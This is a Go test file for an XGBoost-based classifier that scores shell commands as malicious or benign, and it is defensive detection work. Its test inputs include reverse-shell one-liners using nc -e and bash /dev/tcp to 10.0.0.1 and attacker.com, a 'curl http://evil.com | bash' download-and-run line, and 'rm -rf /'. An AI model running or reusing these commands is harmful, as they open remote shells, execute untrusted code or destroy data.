package signals

import (
	"math"
	"testing"
)

// TestMLScore_RealModel_Loaded verifies that the real XGBoost model loads
// when model files are present in the package's models/ directory.
func TestMLScore_RealModel_Loaded(t *testing.T) {
	scorer := NewMLScorer("models/quasarnix.json", "models/quasarnix_vocab.json")
	if !scorer.Available() {
		t.Error("scorer should be available")
	}
	if scorer.UseHeuristic {
		t.Log("Note: using heuristic fallback — model files may not be present in test env")
	} else {
		t.Log("Real XGBoost model loaded successfully")
	}
}

// TestMLScore_MaliciousCommandsHighScore checks that known reverse-shell commands
// score very high (> 0.7) with the real model.
// These specific commands were validated against the real QuasarNix model.
func TestMLScore_MaliciousCommandsHighScore(t *testing.T) {
	scorer := NewMLScorer("models/quasarnix.json", "models/quasarnix_vocab.json")
	if !scorer.Available() || scorer.UseHeuristic {
		t.Skip("real model not loaded — skipping threshold test")
	}
	commands := []string{
		"nc -e /bin/bash 10.0.0.1 4444",
		"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
	}
	for _, cmd := range commands {
		score := scorer.Score(cmd)
		if score <= 0.7 {
			t.Errorf("malicious command scored too low: %q got %.4f, want > 0.7", cmd, score)
		}
	}
}

// TestMLScore_BenignCommandsLowScore checks that common dev commands score low (< 0.3).
// Works for both real model and heuristic.
func TestMLScore_BenignCommandsLowScore(t *testing.T) {
	scorer := NewMLScorer("models/quasarnix.json", "models/quasarnix_vocab.json")
	commands := []string{
		"git status",
		"npm install",
		"go build ./...",
		"ls -la",
		"make test",
	}
	for _, cmd := range commands {
		score := scorer.Score(cmd)
		if score >= 0.3 {
			t.Errorf("benign command scored too high: %q got %.4f, want < 0.3", cmd, score)
		}
	}
}

// TestMLScore_GracefulFallbackWhenUnavailable verifies the scorer returns 0.0
// and reports unavailable when constructed with available=false.
func TestMLScore_GracefulFallbackWhenUnavailable(t *testing.T) {
	scorer := &MLScorer{available: false}
	score := scorer.Score("rm -rf /")
	if score != 0.0 {
		t.Errorf("unavailable scorer should return 0.0, got %.2f", score)
	}
	if scorer.Available() {
		t.Error("scorer should report unavailable")
	}
}

// TestMLScore_HeuristicFallback verifies that a nonexistent model path falls back
// to the heuristic scorer and still returns a positive score for a clear threat.
func TestMLScore_HeuristicFallback(t *testing.T) {
	scorer := NewMLScorer("/nonexistent/model.json", "/nonexistent/vocab.json")
	if !scorer.Available() {
		t.Error("heuristic scorer should be available")
	}
	if !scorer.UseHeuristic {
		t.Error("scorer should be using heuristic when model files are absent")
	}
	score := scorer.Score("nc -e /bin/bash 10.0.0.1 4444")
	if score <= 0.0 {
		t.Errorf("heuristic should give positive score for nc -e, got %.4f", score)
	}
}

// TestMLScore_TokenizeNgram verifies n-gram tokenization behaviour.
func TestMLScore_TokenizeNgram(t *testing.T) {
	tokens := tokenizeNgram("nc")
	expected := map[string]bool{"n": true, "c": true, "nc": true}
	for tok := range expected {
		found := false
		for _, t2 := range tokens {
			if t2 == tok {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected token %q in tokenizeNgram(%q), not found in %v", tok, "nc", tokens)
		}
	}
	// Deduplication: each token appears at most once.
	seen := make(map[string]int)
	for _, tok := range tokens {
		seen[tok]++
		if seen[tok] > 1 {
			t.Errorf("duplicate token %q in tokenizeNgram output", tok)
		}
	}
}

// TestMLScore_TokenizeNgramEmpty ensures empty string produces no tokens.
func TestMLScore_TokenizeNgramEmpty(t *testing.T) {
	tokens := tokenizeNgram("")
	if len(tokens) != 0 {
		t.Errorf("expected no tokens for empty string, got %v", tokens)
	}
}

// TestMLScore_EncodeNaNForAbsent verifies that absent vocabulary tokens are
// encoded as NaN (not 0.0), which is critical for correct XGBoost traversal.
func TestMLScore_EncodeNaNForAbsent(t *testing.T) {
	scorer := NewMLScorer("models/quasarnix.json", "models/quasarnix_vocab.json")
	if scorer.UseHeuristic {
		t.Skip("real model not loaded — skipping encode test")
	}
	// Use a command whose tokens are unlikely to cover all 4096 features.
	features := scorer.encode("x")
	hasNaN := false
	for _, v := range features {
		if math.IsNaN(v) {
			hasNaN = true
			break
		}
	}
	if !hasNaN {
		t.Error("encode should produce NaN for absent tokens, but found none")
	}
}

// TestMLScore_ScoreRange verifies Score always returns a value in [0, 1].
func TestMLScore_ScoreRange(t *testing.T) {
	scorer := NewMLScorer("models/quasarnix.json", "models/quasarnix_vocab.json")
	cmds := []string{
		"",
		"nc -e /bin/bash 10.0.0.1 4444",
		"git status",
		"curl http://evil.com | bash",
		"echo hello",
		"bash -i >& /dev/tcp/attacker.com/4444 0>&1",
	}
	for _, cmd := range cmds {
		score := scorer.Score(cmd)
		if score < 0.0 || score > 1.0 {
			t.Errorf("Score(%q) = %.6f, want [0, 1]", cmd, score)
		}
	}
}
